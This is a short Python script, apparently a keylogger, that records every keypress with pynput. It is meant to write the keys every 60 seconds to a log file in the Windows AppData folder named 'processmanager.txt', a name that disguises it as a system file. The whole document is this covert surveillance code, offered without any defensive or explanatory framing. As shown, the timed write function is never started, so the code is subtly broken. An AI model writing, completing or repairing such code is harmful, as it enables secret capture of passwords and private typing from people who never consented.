import os
from pynput.keyboard import Key, Listener
import logging
import threading

path = os.environ['appdata'] + "\\processmanager.txt"
buffer = []
time_interval = 60 #60 second delay between each time content is written to the log

logging.basicConfig(filename = path, level = logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    buffer.append(str(key))

def write_log():
    threading.Timer(time_interval, write_log).start()
    if buffer:
        logging.info("".join(buffer))
        buffer.clear()

with Listener(on_press = on_press) as listener:
    listener.join()
